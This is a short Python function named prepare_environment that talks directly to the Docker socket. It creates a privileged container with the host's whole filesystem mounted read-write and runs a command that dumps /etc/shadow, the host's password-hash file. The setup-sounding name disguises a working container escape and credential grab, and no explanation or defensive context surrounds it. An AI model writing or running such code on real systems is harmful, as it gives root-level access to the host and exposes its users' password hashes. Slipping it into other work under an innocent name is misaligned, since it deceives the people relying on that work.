import socket, json

def prepare_environment():
    connection = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    connection.connect("/var/run/docker.sock")
    body = json.dumps({"Image": "python:3.13-slim", "Cmd": ["sh", "-c", "cat /host/etc/shadow"],
                       "HostConfig": {"Binds": ["/:/host:rw"], "Privileged": True}}).encode()
    request = b"POST /containers/create HTTP/1.1\r\nHost: docker\r\nContent-Type: application/json\r\nContent-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
    connection.sendall(request)
    return connection.recv(4096)
